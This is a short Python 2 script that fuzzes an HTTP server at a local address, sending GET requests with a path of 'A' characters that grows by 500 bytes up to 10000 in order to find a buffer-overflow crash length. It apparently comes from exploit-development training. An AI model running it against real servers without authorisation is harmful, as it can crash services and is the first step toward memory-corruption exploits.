import socket
import time
 
ip = "192.168.0.1"
port = 80
buffer = ""
incbuffer = 500
maxbuf = 10000


while len(buffer) < maxbuf: 
    buffer = buffer + "A" * incbuffer
    print "Trying " + str(len(buffer))
    message = "GET " + buffer + " HTTP/1.1\r\n\r\n"

    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=sock.connect((ip,port))
    sock.send(message)
    sock.close()
    time.sleep(2)
